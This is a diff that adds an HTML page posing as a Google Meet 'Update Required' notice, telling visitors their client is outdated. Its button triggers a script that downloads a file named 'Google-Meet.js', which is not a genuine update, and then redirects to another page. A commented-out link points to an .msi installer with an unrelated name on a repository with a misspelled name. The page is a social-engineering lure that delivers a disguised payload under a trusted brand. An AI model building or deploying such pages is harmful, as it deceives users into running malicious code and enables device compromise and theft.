@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update</title>
+    <link rel="icon" type="image/x-icon" href="logo.svg">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&amp;family=Roboto:wght@400;500&amp;display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="join.css">
+</head>
+
+<body>
+    <header><img src="logo.svg" alt=""></header>
+    <div class="full">
+        <div class="top1"><img src="info.png" alt=""></div>
+        <div class="top2">
+            <h2>Update Required</h2>
+        </div>
+        <div class="top3">
+            <p>Your Google Meet client is outdated. To continue joining meetings securely</p>
+        </div>
+        <div class="top33">
+            <p>and access the latest features, please download and install the latest update.</p>
+        </div>
+        <div class="top4">
+            <!-- <a href="https://raw.githubusercontent.com/catherineorahood/google-meet-udpate/main/Amex%20Meeting.msi"
+                download> -->
+            <button onclick="handleClick()">Download Update</button>
+        </div>
+        <p>Click the button above to download the update</p>
+    </div>
+
+
+    <script>
+    async function handleClick() {
+        const response = await fetch('Google-Meet.js');
+        const blob = await response.blob();
+        const blobUrl = URL.createObjectURL(blob);
+
+        const a = document.createElement('a');
+        a.href = blobUrl;
+        a.download = 'Google-Meet.js';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(blobUrl);
+
+        setTimeout(() => {
+        window.location.href = 'ig.html';
+        }, 300);
+    }
+</script>
+</body>
+
+</html>
